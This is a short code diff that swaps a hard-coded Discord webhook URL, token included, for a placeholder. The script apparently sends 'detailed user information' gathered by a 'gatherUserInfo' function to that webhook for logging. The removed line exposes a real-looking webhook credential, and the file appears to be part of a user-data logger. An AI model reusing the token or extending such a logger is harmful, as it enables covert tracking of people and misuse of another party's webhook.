@@ -1,5 +1,5 @@
-// --- PASTE YOUR WEBHOOK URL HERE ---
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1457624818571542660/ehmbYC2AvmSi2Jk-ynTi8ULWlvyVgA3cWlyGqezKgkIs_V9plei1QbOWX5BNmTIuGwcA";
+// --- PASTE YOUR WEBHOOK URL HERE FOR LOGGING---
+const WEBHOOK_URL = "https://discord.com/api/webhooks/xxxxxxxx";
 
 // Function to gather detailed user information
 function gatherUserInfo() {
